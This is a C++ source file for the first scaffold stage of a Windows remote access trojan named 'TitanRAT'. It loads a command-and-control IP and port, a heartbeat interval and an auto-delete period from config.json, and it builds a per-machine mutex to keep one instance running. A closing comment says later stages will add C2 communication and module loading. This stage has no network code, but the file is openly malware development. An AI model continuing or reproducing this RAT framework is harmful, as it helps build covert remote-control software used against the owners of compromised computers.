// Core/main.cpp
// TitanRAT Microkernel - Stage 1.1 Scaffold
// Compile: cl /SUBSYSTEM:WINDOWS /EHsc /O2 main.cpp /Fe:core.exe
// Link: kernel32.lib user32.lib

#include <windows.h>
#include <string>
#include <fstream>
#include <sstream>
#include <cctype>

// FNV-1a 64-bit hash constants
constexpr unsigned long long FNV_OFFSET_BASIS = 14695981039346656037ULL;
constexpr unsigned long long FNV_PRIME = 1099511628211ULL;

struct Config {
    std::string c2_ip;
    int c2_port;
    int heartbeat_interval;
    int auto_delete_days;
};

// Trim whitespace from both ends
static std::string trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

// Extract string value for a given key from JSON content (simple parser)
static bool find_string_value(const std::string& json, const std::string& key, std::string& out) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return false;
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return false;
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return false;
    size_t end = json.find('"', pos + 1);
    if (end == std::string::npos) return false;
    out = json.substr(pos + 1, end - pos - 1);
    return true;
}

// Extract integer value for a given key from JSON content
static bool find_int_value(const std::string& json, const std::string& key, int& out) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return false;
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return false;
    // Skip whitespace
    pos = json.find_first_not_of(" \t\r\n", pos + 1);
    if (pos == std::string::npos) return false;
    // Parse integer (handle optional minus)
    size_t end = pos;
    if (json[end] == '-' || json[end] == '+') end++;
    while (end < json.length() && std::isdigit(json[end])) end++;
    if (end == pos || (end == pos + 1 && (json[pos] == '-' || json[pos] == '+'))) return false;
    try {
        out = std::stoi(json.substr(pos, end - pos));
        return true;
    } catch (...) {
        return false;
    }
}

// Load configuration from config.json in the same directory as the executable
static bool load_config(Config& cfg) {
    // Get executable path
    char exe_path[MAX_PATH];
    if (!GetModuleFileNameA(nullptr, exe_path, sizeof(exe_path))) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to get executable path", "Error", MB_ICONERROR);
        return false;
    }
    
    // Extract directory
    std::string dir(exe_path);
    size_t last_slash = dir.find_last_of("\\/");
    if (last_slash != std::string::npos) {
        dir = dir.substr(0, last_slash + 1);
    } else {
        dir = "";
    }
    
    std::string config_path = dir + "config.json";
    
    // Read file
    std::ifstream file(config_path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to open config.json", "Error", MB_ICONERROR);
        return false;
    }
    
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::string content(static_cast<size_t>(size), '\0');
    if (!file.read(&content[0], size)) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to read config.json", "Error", MB_ICONERROR);
        return false;
    }
    file.close();
    
    // Parse values
    if (!find_string_value(content, "c2_ip", cfg.c2_ip) ||
        !find_int_value(content, "c2_port", cfg.c2_port) ||
        !find_int_value(content, "heartbeat_interval", cfg.heartbeat_interval) ||
        !find_int_value(content, "auto_delete_days", cfg.auto_delete_days)) {
        MessageBoxA(nullptr, "[TitanRAT] Invalid config.json format", "Error", MB_ICONERROR);
        return false;
    }
    
    // Log success
    char log_buf[512];
    sprintf_s(log_buf, "[TitanRAT] Config: c2_ip=%s, c2_port=%d, heartbeat_interval=%d, auto_delete=%d\n",
              cfg.c2_ip.c_str(), cfg.c2_port, cfg.heartbeat_interval, cfg.auto_delete_days);
    OutputDebugStringA(log_buf);
    
    return true;
}

// FNV-1a 64-bit hash
static unsigned long long fnv1a_hash(const char* data, size_t len) {
    unsigned long long hash = FNV_OFFSET_BASIS;
    for (size_t i = 0; i < len; i++) {
        hash ^= static_cast<unsigned char>(data[i]);
        hash *= FNV_PRIME;
    }
    return hash;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    OutputDebugStringA("[TitanRAT] Started\n");
    
    // Get computer name
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size)) {
        OutputDebugStringA("[TitanRAT] Failed to get computer name\n");
        return 1;
    }
    
    // Convert to lowercase for consistent hashing
    for (DWORD i = 0; i < size; i++) {
        computer_name[i] = static_cast<char>(tolower(static_cast<unsigned char>(computer_name[i])));
    }
    
    // Compute FNV-1a hash
    unsigned long long hash = fnv1a_hash(computer_name, size);
    
    // Create mutex name
    char mutex_name[128];
    sprintf_s(mutex_name, "Global\\TitanRAT_%016llX", hash);
    
    // Create mutex
    HANDLE h_mutex = CreateMutexA(nullptr, FALSE, mutex_name);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        OutputDebugStringA("[TitanRAT] Already running\n");
        if (h_mutex) CloseHandle(h_mutex);
        return 0;
    }
    
    if (!h_mutex) {
        OutputDebugStringA("[TitanRAT] Failed to create mutex\n");
        return 1;
    }
    
    // Load configuration
    Config cfg;
    if (!load_config(cfg)) {
        CloseHandle(h_mutex);
        return 1;
    }
    
    // Main loop placeholder - future stages will add C2 communication, module loading, etc.
    
    // Cleanup
    CloseHandle(h_mutex);
    return 0;
}